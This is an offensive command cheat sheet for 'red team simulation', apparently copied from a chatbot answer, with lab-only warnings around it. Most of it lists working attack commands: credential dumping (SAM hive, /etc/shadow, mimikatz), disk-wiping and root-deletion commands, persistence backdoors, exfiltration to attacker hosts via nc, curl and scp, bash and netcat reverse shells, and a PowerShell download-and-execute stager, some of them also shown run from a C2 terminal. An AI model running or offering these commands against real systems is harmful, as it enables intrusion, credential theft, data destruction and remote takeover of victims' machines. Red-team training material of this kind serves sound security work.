⚠️ Warning: These commands can destroy data, disable systems, or exfiltrate sensitive information. Only execute in isolated VMs/labs you own. Never run them on real systems without explicit permission.

🔥 Offensive Command Reference (For Red Team Simulation)
🧠 SYSTEM RECONNAISSANCE
Command	Target OS	Description
whoami	All	Current user
hostname	All	System hostname
ipconfig /all	Windows	Detailed IP info
ifconfig	Linux/mac	Network interfaces
netstat -ano	Windows	Open ports with PID
netstat -tulpn	Linux	Active network sockets
tasklist / ps aux	All	Running processes
wmic product get name	Windows	Installed programs
net user	Windows	List users
cat /etc/passwd	Linux	Local user list

🔑 CREDENTIAL DUMPING
Command	Target OS	Purpose
reg save HKLM\SAM sam	Windows	Save SAM hive
reg save HKLM\SYSTEM system	Windows	Save SYSTEM hive
copy C:\Windows\System32\config\SAM	Windows	Directly copy credential database
mimikatz (uploaded binary)	Windows	Extract passwords/tokens
cat /etc/shadow	Linux	Password hashes (requires root)
find / -name "*.kdbx"	Linux	Find KeePass DBs

💣 DESTRUCTIVE & WIPING COMMANDS (⚠️ DO NOT USE OUTSIDE OF A LAB)
Command	Target OS	Effect
del /f /s /q C:\*.*	Windows	Deletes all files (forced)
rd /s /q C:\	Windows	Recursively deletes root directory
format C: /q /fs:NTFS	Windows	Quick format (requires prompt bypass)
rm -rf / --no-preserve-root	Linux	Deletes entire root file system
dd if=/dev/zero of=/dev/sda bs=1M	Linux	Overwrites disk with zeroes
mkfs.ext4 /dev/sda	Linux	Reformats disk

💡 These are high-risk "scorched earth" commands. Use only to simulate ransomware, disk wiping, or sabotage scenarios.

🪟 PERSISTENCE & BACKDOORS
Command	Target OS	Effect
schtasks /create /tn backdoor ...	Windows	Schedule task to run on boot
reg add HKCU\Software\Microsoft\Windows\...	Windows	Registry-based startup persistence
echo @reboot python3 client.py >> crontab	Linux	Adds to crontab for startup
cp client.py /etc/init.d/ && update-rc.d	Linux	Boot persistence
copy backdoor.exe C:\Users\Public\...	Windows	Drops payload into shared location

📡 DATA EXFILTRATION
Command	Target OS	Function
powershell Invoke-WebRequest ...	Windows	Upload file to remote server
curl -F 'file=@/etc/passwd' http://...	Linux	Exfiltrates via HTTP POST
nc attacker.com 4444 < file.txt	All	Send file over raw socket
scp file.txt user@attacker.com:/loot	All	Secure copy to remote attacker

🎯 LATERAL MOVEMENT
Command	Target OS	Description
net use \\victim\C$ /user:admin pass	Windows	Authenticate to remote admin share
wmic /node:"victim" process call create	Windows	Run remote command
smbclient //victim/C$ -U admin	Linux	Connect to Windows share
ssh user@192.168.1.20	Linux	SSH pivoting

🐚 PAYLOAD EXECUTION (Reverse Shells)
Command	Target OS	Description
nc -e /bin/sh attacker_ip 4444	Linux	Reverse shell (Unix)
powershell -c "IEX (New-Object WebClient).DownloadString(...)"	Windows	PowerShell stager
bash -i >& /dev/tcp/attacker_ip/4444 0>&1	Linux	Bash reverse shell

🦠 RANSOMWARE / LOCKING (Simulated)
Command	Description
Python script to encrypt user folders using AES	Simulate ransomware infection
Replace .txt files with ransom notes	Mock file renaming / hostage behavior
Disable Task Manager, Regedit, Explorer	Simulate lockscreen malware

⚠️ BONUS: COMBO KILL SWITCH (for test VM reset)
bash
Copy
Edit
# Linux kill-switch
rm -rf ~/Documents ~/Pictures ~/Desktop && pkill -u $(whoami)

# Windows kill-switch
del /f /q /s "%USERPROFILE%\Documents" && shutdown /s /t 0
🧪 Usage in Reverse Shell
From the C2 terminal:

bash
Copy
Edit
shell @192.168.1.15 >> net user
shell @192.168.1.15 >> reg save HKLM\SAM sam
shell @192.168.1.15 >> del /f /s /q C:\Windows\System32
shell @192.168.1.15 >> powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2/payload.ps1')"
🔐 Precautionary Notes
Always test in virtualized lab environments (Kali, Windows VM, Linux sandbox).

Run inside isolated virtual switches or NAT.

Use snapshots and automation to reset lab state after destructive tests.